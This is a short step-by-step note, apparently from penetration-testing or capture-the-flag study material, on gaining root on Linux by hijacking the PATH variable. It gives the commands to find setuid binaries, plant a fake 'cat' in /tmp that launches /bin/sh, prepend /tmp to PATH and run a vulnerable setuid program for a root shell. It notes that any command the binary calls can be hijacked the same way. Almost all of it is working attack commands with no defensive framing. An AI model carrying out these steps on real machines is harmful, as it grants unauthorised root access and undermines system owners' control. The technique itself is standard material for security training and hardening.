# Escalate Privilege by leveraging the $PATH variable

1. echo $PATH and see what it lists

2. Find any files with setuid
   find / -perm -u=s -type f 2>/dev/null

3. Suppose we find a binary called - shell under /scripts

4. Running it gives us the result of cat /etc/passwd so we can create a malicious file for cat and change PATH

5. echo "/bin/sh" > /tmp/cat
          OR
   cp /bin/sh /tmp/cat
          OR
   ln -s /bin/sh /tmp/cat
          OR
  Use vi/nano/gedit etc. to create our file

6. chmod +x cat

7. export PATH=/tmp:$PATH

8. Now once we run ./shell we get a root shell back instantly.

NOTE : As for 'cat' here we can do the same for any command (id,ps etc.) and have it redirect to our root shell.
